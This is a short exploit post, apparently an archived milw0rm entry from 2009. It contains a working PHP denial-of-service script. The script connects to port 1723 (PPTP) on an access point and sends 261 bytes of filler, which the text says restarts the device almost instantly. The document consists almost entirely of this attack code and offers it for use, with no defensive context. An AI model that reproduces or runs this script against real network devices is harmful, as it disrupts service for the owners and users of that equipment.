Attacking port 1723(flood), it restarts the device almost instantly, here's the code in PHP.
It takes a few bytes for the AP to automatically restart

<?php
$apaddr = "192.168.2.1";
$apport="1723";


$con = fsockopen($apaddr, $apport, $errno, $errstr);
if (!$con) {
    echo "$errstr ($errno)<br />\n";
} else {
    $trash = str_repeat("\x90","261");
    fwrite($con, $trash);
    while (!feof($con)) {
        echo "$trash \r\n";
    }
    fclose($con);
}
?> 

# milw0rm.com [2009-09-11]